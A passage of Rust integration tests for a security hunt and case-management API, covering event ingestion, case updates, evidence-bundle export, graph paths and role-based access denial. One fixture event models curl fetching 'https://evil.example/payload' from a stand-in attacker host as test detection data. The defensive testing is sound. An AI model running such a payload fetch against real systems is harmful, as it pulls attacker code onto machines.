                "grantId": grant_id.to_string(),
                "detectionIds": [finding_id.to_string()],
                "target": {
                    "kind": "process",
                    "id": "2001",
                    "name": "curl"
                },
                "evidence": {
                    "rawRef": detection_raw_ref,
                    "envelopeHash": "hash-operator-flow-detection-1",
                    "issuer": "spiffe://tenant/acme-int",
                    "schemaName": "clawdstrike.sdr.fact.tetragon_event.v1",
                    "signatureValid": true
                },
                "attributes": {
                    "process": "/usr/bin/curl",
                    "pod": "operator-endpoint",
                    "url": "https://evil.example/payload"
                }
            }),
        )),
    )
    .await;
    assert_eq!(detection_event_resp.0, StatusCode::OK);

    let response_event_id = "operator-flow-hunt-2";
    let response_event_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/events/ingest".to_string(),
        Some(&harness.api_key),
        Some(signed_hunt_ingest_request(
            &harness,
            serde_json::json!({
                "eventId": response_event_id,
                "tenantId": harness.tenant_id.to_string(),
                "source": "response",
                "kind": "response_action_updated",
                "occurredAt": "2026-03-06T13:05:00Z",
                "ingestedAt": "2026-03-06T13:05:01Z",
                "severity": "medium",
                "verdict": "deny",
                "summary": "response action published for Operator Endpoint",
                "actionType": "request_policy_reload",
                "principal": {
                    "principalId": principal_id.to_string(),
                    "endpointAgentId": agent_id,
                    "principalType": "endpoint_agent"
                },
                "sessionId": session_id,
                "grantId": grant_id.to_string(),
                "responseActionId": action_id.to_string(),
                "detectionIds": [finding_id.to_string()],
                "target": {
                    "kind": "endpoint",
                    "id": agent_id,
                    "name": "Operator Endpoint"
                },
                "evidence": {
                    "rawRef": response_raw_ref,
                    "envelopeHash": "hash-operator-flow-response-1",
                    "issuer": "spiffe://tenant/acme-int",
                    "schemaName": "clawdstrike.sdr.fact.response_action.v1",
                    "signatureValid": true
                },
                "attributes": {
                    "status": "published",
                    "message": "policy reload published"
                }
            }),
        )),
    )
    .await;
    assert_eq!(response_event_resp.0, StatusCode::OK);

    let update_case_resp = request_json(
        &harness.app,
        Method::PATCH,
        format!("/api/v1/cases/{case_id}"),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "status": "in_progress",
            "responseActionIds": [action_id.to_string()],
            "grantIds": [grant_id.to_string()]
        })),
    )
    .await;
    assert_eq!(update_case_resp.0, StatusCode::OK);
    assert_eq!(update_case_resp.1["status"], "in_progress");
    assert_eq!(
        update_case_resp.1["responseActionIds"],
        serde_json::json!([action_id.to_string()])
    );
    assert_eq!(
        update_case_resp.1["grantIds"],
        serde_json::json!([grant_id.to_string()])
    );

    let exercise_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/grants/{grant_id}/exercise"),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "event_id": response_event_id,
            "session_id": session_id,
            "response_action_id": action_id.to_string(),
        })),
    )
    .await;
    assert_eq!(exercise_resp.0, StatusCode::OK);
    assert!(exercise_resp.1["edges"]
        .as_array()
        .expect("grant exercise edges")
        .iter()
        .any(|edge| edge["kind"] == "exercised_in_event"));

    let search_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/search".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "principalId": principal_id.to_string(),
            "limit": 10
        })),
    )
    .await;
    assert_eq!(search_resp.0, StatusCode::OK);
    assert_eq!(search_resp.1["total"], 2);
    assert_eq!(search_resp.1["events"][0]["eventId"], response_event_id);
    assert_eq!(search_resp.1["events"][1]["eventId"], detection_event_id);
    assert_eq!(
        search_resp.1["events"][0]["responseActionId"],
        action_id.to_string()
    );
    assert_eq!(
        search_resp.1["events"][0]["detectionIds"],
        serde_json::json!([finding_id.to_string()])
    );

    let timeline_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/timeline".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "sessionId": session_id,
            "limit": 10
        })),
    )
    .await;
    assert_eq!(timeline_resp.0, StatusCode::OK);
    assert_eq!(timeline_resp.1["groupedBy"], "session");
    assert_eq!(timeline_resp.1["events"][0]["eventId"], detection_event_id);
    assert_eq!(timeline_resp.1["events"][1]["eventId"], response_event_id);

    let raw_graph_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/principals/{principal_id}/delegation-graph"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(raw_graph_resp.0, StatusCode::OK);
    assert_eq!(
        raw_graph_resp.1["root_node_id"],
        format!("principal:{principal_id}")
    );
    assert!(raw_graph_resp.1["nodes"]
        .as_array()
        .expect("raw graph nodes")
        .iter()
        .any(|node| node["id"] == format!("grant:{grant_id}")));
    assert!(raw_graph_resp.1["nodes"]
        .as_array()
        .expect("raw graph nodes")
        .iter()
        .any(|node| node["id"] == format!("response_action:{action_id}")));
    assert!(raw_graph_resp.1["edges"]
        .as_array()
        .expect("raw graph edges")
        .iter()
        .any(|edge| edge["kind"] == "issued_grant"));
    assert!(raw_graph_resp.1["edges"]
        .as_array()
        .expect("raw graph edges")
        .iter()
        .any(|edge| edge["kind"] == "triggered_response_action"));

    let path_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/graph/paths?from=principal:{principal_id}&to=response_action:{action_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(path_resp.0, StatusCode::OK);
    assert_eq!(
        path_resp.1["root_node_id"],
        format!("principal:{principal_id}")
    );
    assert!(path_resp.1["edges"]
        .as_array()
        .expect("path edges")
        .iter()
        .any(|edge| edge["kind"] == "triggered_response_action"));

    for artifact_request in [
        serde_json::json!({
            "artifactKind": "detection",
            "artifactId": finding_id.to_string(),
            "summary": "Detection finding",
            "metadata": {
                "principalId": principal_id.to_string(),
                "detectionId": finding_id.to_string(),
                "responseActionId": action_id.to_string(),
                "ocsf": finding_resp.1["ocsf"].clone(),
                "evidenceRefs": finding_resp.1["evidence_refs"].clone()
            }
        }),
        serde_json::json!({
            "artifactKind": "response_action",
            "artifactId": action_id.to_string(),
            "summary": "Response action publication",
            "metadata": {
                "principalId": principal_id.to_string(),
                "detectionId": finding_id.to_string(),
                "responseActionId": action_id.to_string(),
                "status": "published",
                "caseId": case_id,
                "sourceDetectionId": finding_id.to_string()
            }
        }),
        serde_json::json!({
            "artifactKind": "graph_snapshot",
            "artifactId": format!("principal:{principal_id}->response_action:{action_id}"),
            "summary": "Principal to response-action graph path",
            "metadata": {
                "principalId": principal_id.to_string(),
                "detectionId": finding_id.to_string(),
                "responseActionId": action_id.to_string(),
                "graph": path_resp.1.clone()
            }
        }),
        serde_json::json!({
            "artifactKind": "fleet_event",
            "artifactId": detection_event_id,
            "summary": "Detection hunt event",
            "metadata": {
                "principalId": principal_id.to_string(),
                "detectionId": finding_id.to_string(),
                "responseActionId": action_id.to_string(),
                "eventId": detection_event_id,
                "rawRef": detection_raw_ref,
                "detectionIds": [finding_id.to_string()]
            }
        }),
        serde_json::json!({
            "artifactKind": "raw_envelope",
            "artifactId": detection_raw_ref,
            "summary": "Detection raw envelope",
            "metadata": {
                "principalId": principal_id.to_string(),
                "detectionId": finding_id.to_string(),
                "responseActionId": action_id.to_string(),
                "rawRef": detection_raw_ref,
                "schema": "clawdstrike.sdr.fact.tetragon_event.v1"
            }
        }),
    ] {
        let artifact_resp = request_json(
            &harness.app,
            Method::POST,
            format!("/api/v1/cases/{case_id}/artifacts"),
            Some(&harness.api_key),
            Some(artifact_request),
        )
        .await;
        assert_eq!(artifact_resp.0, StatusCode::OK);
    }

    let export_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/cases/{case_id}/evidence/export"),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "principalIds": [principal_id.to_string()],
            "detectionIds": [finding_id.to_string()],
            "responseActionIds": [action_id.to_string()],
            "includeRawEnvelopes": true,
            "includeOcsf": true,
            "retentionDays": 7
        })),
    )
    .await;
    assert_eq!(export_resp.0, StatusCode::OK);
    assert_eq!(export_resp.1["status"], "completed");
    assert_eq!(export_resp.1["artifactCounts"]["detection"], 1);
    assert_eq!(export_resp.1["artifactCounts"]["response_action"], 1);
    assert_eq!(export_resp.1["artifactCounts"]["graph_snapshot"], 1);
    assert_eq!(export_resp.1["artifactCounts"]["fleet_event"], 1);
    assert_eq!(export_resp.1["artifactCounts"]["raw_envelope"], 1);
    let export_id = export_resp.1["exportId"].as_str().expect("export id");
    let export_path = export_resp.1["filePath"]
        .as_str()
        .expect("bundle file path");
    assert!(std::path::Path::new(export_path).exists());

    let bundle_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/evidence-bundles/{export_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(bundle_resp.0, StatusCode::OK);
    assert_eq!(bundle_resp.1["status"], "completed");

    let case_detail_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/cases/{case_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(case_detail_resp.0, StatusCode::OK);
    assert_eq!(
        case_detail_resp.1["case"]["responseActionIds"],
        serde_json::json!([action_id.to_string()])
    );
    assert_eq!(
        case_detail_resp.1["case"]["grantIds"],
        serde_json::json!([grant_id.to_string()])
    );
    assert_eq!(
        case_detail_resp.1["artifacts"]
            .as_array()
            .expect("case artifacts")
            .len(),
        6
    );
    assert_eq!(
        case_detail_resp.1["evidenceBundles"]
            .as_array()
            .expect("case bundles")
            .len(),
        1
    );

    let case_timeline_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/cases/{case_id}/timeline"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(case_timeline_resp.0, StatusCode::OK);
    let case_timeline = case_timeline_resp.1.as_array().expect("case timeline");
    let event_kinds = case_timeline
        .iter()
        .filter_map(|event| event["eventKind"].as_str())
        .collect::<Vec<_>>();
    assert!(event_kinds.contains(&"case_created"));
    assert!(event_kinds.contains(&"status_changed"));
    assert!(event_kinds.contains(&"case_updated"));
    assert!(event_kinds.contains(&"bundle_requested"));
    assert!(event_kinds.contains(&"bundle_completed"));
    assert_eq!(
        event_kinds
            .iter()
            .filter(|kind| **kind == "artifact_added")
            .count(),
        5
    );

    let principals_resp = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/console/principals".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(principals_resp.0, StatusCode::OK);
    let principals = principals_resp.1.as_array().expect("console principals");
    assert_eq!(principals.len(), 1);
    assert_eq!(principals[0]["principalId"], principal_id.to_string());
    assert_eq!(principals[0]["displayName"], "Operator Endpoint");

    let principal_detail_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/console/principals/{principal_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(principal_detail_resp.0, StatusCode::OK);
    assert_eq!(
        principal_detail_resp.1["principal"]["principalId"],
        principal_id.to_string()
    );
    assert_eq!(
        principal_detail_resp.1["activeGrants"][0]["grantId"],
        grant_id.to_string()
    );
    assert_eq!(
        principal_detail_resp.1["recentSessions"][0]["sessionId"],
        session_id
    );

    let console_actions_resp = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/console/response-actions".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(console_actions_resp.0, StatusCode::OK);
    let console_actions = console_actions_resp
        .1
        .as_array()
        .expect("console response actions");
    assert_eq!(console_actions.len(), 1);
    assert_eq!(console_actions[0]["status"], "published");
    assert_eq!(console_actions[0]["targetDisplayName"], "Operator Endpoint");
    assert_eq!(
        console_actions[0]["sourceDetectionId"],
        finding_id.to_string()
    );

    let console_timeline_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/console/timeline?principal_id={principal_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(console_timeline_resp.0, StatusCode::OK);
    let console_timeline = console_timeline_resp
        .1
        .as_array()
        .expect("console timeline");
    assert_eq!(console_timeline.len(), 2);
    assert_eq!(console_timeline[0]["eventId"], response_event_id);
    assert_eq!(
        console_timeline[0]["metadata"]["responseActionId"],
        action_id.to_string()
    );
    assert_eq!(
        console_timeline[0]["metadata"]["detectionIds"],
        serde_json::json!([finding_id.to_string()])
    );

    let console_graph_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/console/principals/{principal_id}/graph"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(console_graph_resp.0, StatusCode::OK);
    assert_eq!(
        console_graph_resp.1["rootPrincipalId"],
        principal_id.to_string()
    );
    assert!(console_graph_resp.1["nodes"]
        .as_array()
        .expect("console graph nodes")
        .iter()
        .any(|node| node["id"] == grant_id.to_string()));
    assert!(console_graph_resp.1["nodes"]
        .as_array()
        .expect("console graph nodes")
        .iter()
        .any(|node| node["id"] == action_id.to_string()));
    assert!(console_graph_resp.1["edges"]
        .as_array()
        .expect("console graph edges")
        .iter()
        .any(|edge| edge["kind"] == "triggered_response_action"));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn case_list_filters_by_query_status_and_severity() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;

    for payload in [
        serde_json::json!({
            "title": "Endpoint archive case",
            "summary": "Retained archive investigation",
            "severity": "high",
            "status": "open",
            "tags": ["endpoint-evidence"]
        }),
        serde_json::json!({
            "title": "Closed phishing investigation",
            "summary": "Browser download credential theft",
            "severity": "low",
            "status": "closed",
            "tags": ["phishing"]
        }),
        serde_json::json!({
            "title": "Closed high impact investigation",
            "summary": "Credential theft",
            "severity": "high",
            "status": "closed",
            "tags": ["phishing"]
        }),
    ] {
        let case_resp = request_json(
            &harness.app,
            Method::POST,
            "/api/v1/cases".to_string(),
            Some(&harness.api_key),
            Some(payload),
        )
        .await;
        assert_eq!(case_resp.0, StatusCode::OK);
    }

    let filtered_resp = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/cases?q=phishing&status=closed&severity=low".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(filtered_resp.0, StatusCode::OK);
    let cases = filtered_resp.1.as_array().expect("case list");
    assert_eq!(cases.len(), 1);
    assert_eq!(cases[0]["title"], "Closed phishing investigation");
    assert_eq!(cases[0]["status"], "closed");
    assert_eq!(cases[0]["severity"], "low");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn case_bulk_status_transition_updates_selected_cases_and_timeline() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let mut case_ids = Vec::new();

    for payload in [
        serde_json::json!({
            "title": "Bulk transition primary",
            "summary": "selected for bulk closure",
            "severity": "high",
            "status": "open",
            "tags": ["bulk-lifecycle"]
        }),
        serde_json::json!({
            "title": "Bulk transition secondary",
            "summary": "also selected for bulk closure",
            "severity": "medium",
            "status": "in_progress",
            "tags": ["bulk-lifecycle"]
        }),
        serde_json::json!({
            "title": "Bulk transition untouched",
            "summary": "must remain open",
            "severity": "low",
            "status": "open",
            "tags": ["bulk-lifecycle"]
        }),
    ] {
        let case_resp = request_json(
            &harness.app,
            Method::POST,
            "/api/v1/cases".to_string(),
            Some(&harness.api_key),
            Some(payload),
        )
        .await;
        assert_eq!(case_resp.0, StatusCode::OK);
        case_ids.push(
            case_resp.1["id"]
                .as_str()
                .expect("created case id")
                .to_string(),
        );
    }

    let bulk_request = Request::builder()
        .method(Method::PATCH)
        .uri("/api/v1/cases/bulk")
        .header("content-type", "application/json")
        .header("x-api-key", &harness.api_key)
        .body(Body::from(
            serde_json::to_vec(&serde_json::json!({
                "caseIds": [case_ids[0], case_ids[1]],
                "status": "closed"
            }))
            .expect("serialize bulk body"),
        ))
        .expect("build bulk request");
    let bulk_response = harness
        .app
        .clone()
        .oneshot(bulk_request)
        .await
        .expect("bulk route request");
    let bulk_status = bulk_response.status();
    let bulk_bytes = to_bytes(bulk_response.into_body(), 2 * 1024 * 1024)
        .await
        .expect("read bulk response body");
    assert_eq!(bulk_status, StatusCode::OK);
    let bulk_body = serde_json::from_slice::<Value>(&bulk_bytes).expect("bulk response json");
    let updated = bulk_body.as_array().expect("updated cases");
    assert_eq!(updated.len(), 2);
    assert!(updated.iter().all(|case| case["status"] == "closed"));

    let closed_resp = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/cases?status=closed&q=bulk-lifecycle".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(closed_resp.0, StatusCode::OK);
    assert_eq!(closed_resp.1.as_array().expect("closed cases").len(), 2);

    let untouched_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/cases/{}", case_ids[2]),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(untouched_resp.0, StatusCode::OK);
    assert_eq!(untouched_resp.1["case"]["status"], "open");

    let timeline_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/cases/{}/timeline", case_ids[0]),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(timeline_resp.0, StatusCode::OK);
    let timeline = timeline_resp.1.as_array().expect("case timeline");
    assert!(timeline.iter().any(|event| {
        event["eventKind"] == "status_changed"
            && event["payload"]["previousStatus"] == "open"
            && event["payload"]["status"] == "closed"
            && event["payload"]["bulk"] == true
    }));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn case_artifacts_require_verified_references_and_mark_annotations_untrusted() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let fixture = seed_operator_flow_fixture(&harness).await;

    let missing_event_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/cases/{}/artifacts", fixture.case_id),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "artifactKind": "fleet_event",
            "artifactId": "missing-event",
            "summary": "spoofed event",
            "metadata": {
                "artifactClass": "verified_reference",
                "sourceTable": "hunt_events"
            }
        })),
    )
    .await;
    assert_eq!(missing_event_resp.0, StatusCode::NOT_FOUND);

    let missing_envelope_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/cases/{}/artifacts", fixture.case_id),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "artifactKind": "raw_envelope",
            "artifactId": "missing-envelope",
            "summary": "spoofed envelope",
            "metadata": {
                "artifactClass": "verified_reference",
                "sourceTable": "hunt_envelopes"
            }
        })),
    )
    .await;
    assert_eq!(missing_envelope_resp.0, StatusCode::NOT_FOUND);

    let missing_archive_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/cases/{}/artifacts", fixture.case_id),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "artifactKind": "endpoint_evidence_archive",
            "artifactId": "missing-archive",
            "summary": "spoofed archive",
            "metadata": {
                "artifactClass": "verified_reference",
                "sourceTable": "endpoint_evidence_archives"
            }
        })),
    )
    .await;
    assert_eq!(missing_archive_resp.0, StatusCode::NOT_FOUND);

    let bundle_export_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/cases/{}/artifacts", fixture.case_id),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "artifactKind": "bundle_export",
            "artifactId": "export-1",
            "summary": "should be rejected",
            "metadata": {}
        })),
    )
    .await;
    assert_eq!(bundle_export_resp.0, StatusCode::BAD_REQUEST);

    let archive = serde_json::json!({
        "schemaVersion": 1,
        "bundle": {
            "bundleId": "evidence_bundle-case-1",
            "graphSliceId": "graph_slice-case-1",
            "contentHash": "0xcontentcase"
        },
        "artifact": {
            "byteCount": 96
        },
        "graph": {
            "nodes": {
                "process:case": {
                    "nodeId": "process:case",
                    "kind": "process",
                    "label": "python"
                }
            },
            "edges": []
        },
        "receipts": []
    });
    let archive_hash = canonical_json_hash_for_test(&archive);
    let archive_id = "evidence_bundle_archive-case-1";
    let archive_raw_ref = format!("endpoint-evidence-bundle-archive:{archive_id}:{archive_hash}");
    let upload_archive_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/evidence-bundle-archives".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "archiveId": archive_id,
            "archiveHash": archive_hash,
            "rawRef": archive_raw_ref,
            "bundleId": "evidence_bundle-case-1",
            "endpointAgentId": &fixture.agent_id,
            "eventId": format!("evidence-bundle-archive:{}:{archive_id}", &fixture.agent_id),
            "rawArtifactApprovalId": "approval-archive-case-1",
            "rawArtifactApprovalReasonHash": "0x3333333333333333",
            "archive": archive,
            "verification": {
                "verified": true,
                "archiveHashMatches": true
            },
            "retentionDays": 30,
            "metadata": {
                "source": "agent"
            }
        })),
    )
    .await;
    assert_eq!(upload_archive_resp.0, StatusCode::OK);

    let archive_artifact_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/cases/{}/artifacts", fixture.case_id),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "artifactKind": "endpoint_evidence_archive",
            "artifactId": archive_id,
            "summary": "spoofed archive summary",
            "metadata": {
                "artifactClass": "operator_annotation",
                "sourceTable": "spoofed"
            }
        })),
    )
    .await;
    assert_eq!(archive_artifact_resp.0, StatusCode::OK);

    let response_action_artifact_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/cases/{}/artifacts", fixture.case_id),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "artifactKind": "response_action",
            "artifactId": fixture.action_id.to_string(),
            "summary": "spoofed response summary",
            "metadata": {
                "artifactClass": "verified_reference",
                "status": "acknowledged",
                "sourceTable": "totally_fake"
            }
        })),
    )
    .await;
    assert_eq!(response_action_artifact_resp.0, StatusCode::OK);

    let note_artifact_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/cases/{}/artifacts", fixture.case_id),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "artifactKind": "note",
            "artifactId": "operator-note-1",
            "summary": "operator note",
            "metadata": {
                "artifactClass": "verified_reference",
                "message": "manual analyst note"
            }
        })),
    )
    .await;
    assert_eq!(note_artifact_resp.0, StatusCode::OK);

    let case_detail_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/cases/{}", fixture.case_id),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(case_detail_resp.0, StatusCode::OK);
    let artifacts = case_detail_resp.1["artifacts"]
        .as_array()
        .expect("case artifacts");

    let response_action_artifact = artifacts
        .iter()
        .find(|artifact| {
            artifact["artifactKind"] == "response_action"
                && artifact["artifactId"] == fixture.action_id.to_string()
        })
        .expect("response_action artifact");
    assert_eq!(
        response_action_artifact["summary"],
        format!("request_policy_reload -> endpoint:{}", fixture.agent_id)
    );
    assert_eq!(
        response_action_artifact["metadata"]["artifactClass"],
        "verified_reference"
    );
    assert_eq!(
        response_action_artifact["metadata"]["sourceTable"],
        "response_actions"
    );
    assert_eq!(response_action_artifact["metadata"]["status"], "queued");

    let archive_artifact = artifacts
        .iter()
        .find(|artifact| {
            artifact["artifactKind"] == "endpoint_evidence_archive"
                && artifact["artifactId"] == archive_id
        })
        .expect("endpoint_evidence_archive artifact");
    assert_eq!(
        archive_artifact["summary"],
        "endpoint evidence archive evidence_bundle-case-1"
    );
    assert_eq!(
        archive_artifact["metadata"]["artifactClass"],
        "verified_reference"
    );
    assert_eq!(
        archive_artifact["metadata"]["sourceTable"],
        "endpoint_evidence_archives"
    );
    assert_eq!(
        archive_artifact["metadata"]["sourceFamily"],
        "endpoint_evidence_archive"
    );
    assert_eq!(archive_artifact["metadata"]["rawRef"], archive_raw_ref);
    assert_eq!(archive_artifact["metadata"]["archiveHash"], archive_hash);
    assert_eq!(
        archive_artifact["metadata"]["endpointAgentId"],
        fixture.agent_id
    );
    assert_eq!(
        archive_artifact["metadata"]["verification"]["verified"],
        true
    );
    assert_eq!(
        archive_artifact["metadata"]["archiveMetadata"]["source"],
        "agent"
    );

    let note_artifact = artifacts
        .iter()
        .find(|artifact| artifact["artifactKind"] == "note")
        .expect("note artifact");
    assert_eq!(
        note_artifact["metadata"]["artifactClass"],
        "operator_annotation"
    );
    assert_eq!(note_artifact["metadata"]["message"], "manual analyst note");

    let member_api_key = "cs_it_case_archive_member_key";
    insert_api_key_for_tenant(
        &harness.db,
        harness.tenant_id,
        member_api_key,
        "case-archive-member",
        &["write"],
    )
    .await;
    let denied_archive_download_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/hunt/evidence-bundle-archives/{archive_id}/download"),
        Some(member_api_key),
        None,
    )
    .await;
    assert_eq!(denied_archive_download_resp.0, StatusCode::FORBIDDEN);

    let case_bundle_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/cases/{}/evidence/export", fixture.case_id),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "includeRawEnvelopes": true
        })),
    )
    .await;
    assert_eq!(case_bundle_resp.0, StatusCode::OK);
    assert_eq!(
        case_bundle_resp.1["artifactCounts"]["endpoint_evidence_archive"],
        1
    );
    assert_eq!(case_bundle_resp.1["artifactCounts"]["audit_event"], 2);
    let case_bundle_export_id = case_bundle_resp.1["exportId"]
        .as_str()
        .expect("case bundle export id");
    let bundle_exported_audit_row = sqlx::query::query(
        r#"SELECT event_type, quantity, metadata
           FROM usage_events
           WHERE tenant_id = $1
             AND event_type = 'case_evidence_bundle.exported'"#,
    )
    .bind(harness.tenant_id)
    .fetch_one(&harness.db)
    .await
    .expect("bundle export should be audited");
    let bundle_exported_metadata: Value = bundle_exported_audit_row
        .try_get("metadata")
        .expect("bundle export audit metadata");
    assert_eq!(
        bundle_exported_audit_row
            .try_get::<String, _>("event_type")
            .expect("bundle export event type"),
        "case_evidence_bundle.exported"
    );
    assert_eq!(
        bundle_exported_audit_row
            .try_get::<i32, _>("quantity")
            .expect("bundle export quantity"),
        1
    );
    assert_eq!(bundle_exported_metadata["exportId"], case_bundle_export_id);
    assert_eq!(
        bundle_exported_metadata["caseId"],
        fixture.case_id.to_string()
    );
    assert_eq!(
        bundle_exported_metadata["artifactCounts"]["endpoint_evidence_archive"],
        1
    );
    assert_eq!(bundle_exported_metadata["artifactCounts"]["audit_event"], 2);
    assert_eq!(bundle_exported_metadata["actorType"], "service");
    assert_eq!(bundle_exported_metadata["actorRole"], "admin");
    assert!(bundle_exported_metadata["sha256"].as_str().is_some());
    assert!(bundle_exported_metadata["sizeBytes"].as_i64().is_some());
    assert!(bundle_exported_metadata.get("bundle").is_none());

    let admin_bundle_metadata_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/evidence-bundles/{case_bundle_export_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(admin_bundle_metadata_resp.0, StatusCode::OK);
    assert_eq!(
        admin_bundle_metadata_resp.1["exportId"],
        case_bundle_export_id
    );
    let bundle_metadata_access_audit_row = sqlx::query::query(
        r#"SELECT event_type, quantity, metadata
           FROM usage_events
           WHERE tenant_id = $1
             AND event_type = 'case_evidence_bundle.metadata_accessed'"#,
    )
    .bind(harness.tenant_id)
    .fetch_one(&harness.db)
    .await
    .expect("bundle metadata access should be audited");
    let bundle_metadata_access: Value = bundle_metadata_access_audit_row
        .try_get("metadata")
        .expect("bundle metadata access audit metadata");
    assert_eq!(
        bundle_metadata_access_audit_row
            .try_get::<String, _>("event_type")
            .expect("bundle metadata access event type"),
        "case_evidence_bundle.metadata_accessed"
    );
    assert_eq!(
        bundle_metadata_access_audit_row
            .try_get::<i32, _>("quantity")
            .expect("bundle metadata access quantity"),
        1
    );
    assert_eq!(bundle_metadata_access["exportId"], case_bundle_export_id);
    assert_eq!(
        bundle_metadata_access["caseId"],
        fixture.case_id.to_string()
    );
    assert_eq!(bundle_metadata_access["actorType"], "service");
    assert_eq!(bundle_metadata_access["actorRole"], "admin");
    assert!(bundle_metadata_access["sha256"].as_str().is_some());
    assert!(bundle_metadata_access["sizeBytes"].as_i64().is_some());
    assert!(bundle_metadata_access.get("bundle").is_none());

    let viewer_api_key = "cs_it_case_bundle_viewer_key";
    insert_api_key_for_tenant(
        &harness.db,
        harness.tenant_id,
        viewer_api_key,
        "case-bundle-viewer",
        &["viewer"],
    )
    .await;
    let viewer_create_bundle_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/cases/{}/evidence/export", fixture.case_id),
        Some(viewer_api_key),
        Some(serde_json::json!({
            "includeRawEnvelopes": true
        })),
    )
    .await;
    assert_eq!(viewer_create_bundle_resp.0, StatusCode::FORBIDDEN);
    let denied_bundle_export_row = sqlx::query::query(
        r#"SELECT event_type, quantity, metadata
           FROM usage_events
           WHERE tenant_id = $1
             AND event_type = 'case_evidence_bundle.export_denied'"#,
    )
    .bind(harness.tenant_id)
    .fetch_one(&harness.db)
    .await
    .expect("denied bundle export should be audited");
    let denied_bundle_export: Value = denied_bundle_export_row
        .try_get("metadata")
        .expect("denied bundle export audit metadata");
    assert_eq!(
        denied_bundle_export_row
            .try_get::<String, _>("event_type")
            .expect("denied bundle export event type"),
        "case_evidence_bundle.export_denied"
    );
    assert_eq!(
        denied_bundle_export_row
            .try_get::<i32, _>("quantity")
            .expect("denied bundle export quantity"),
        1
    );
    assert_eq!(denied_bundle_export["caseId"], fixture.case_id.to_string());
    assert_eq!(denied_bundle_export["actorType"], "service");
    assert_eq!(denied_bundle_export["actorRole"], "viewer");
    assert_eq!(denied_bundle_export["deniedReason"], "non_viewer_required");
    assert!(denied_bundle_export.get("bundle").is_none());

    let viewer_bundle_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/evidence-bundles/{case_bundle_export_id}"),
        Some(viewer_api_key),
        None,
    )
    .await;
    assert_eq!(viewer_bundle_resp.0, StatusCode::FORBIDDEN);

    let viewer_download_request = Request::builder()
        .method(Method::GET)
        .uri(format!(
            "/api/v1/evidence-bundles/{case_bundle_export_id}/download"
        ))
        .header("x-api-key", viewer_api_key)
        .body(Body::empty())
        .expect("build viewer bundle download request");
    let viewer_download_response = harness
        .app
        .clone()
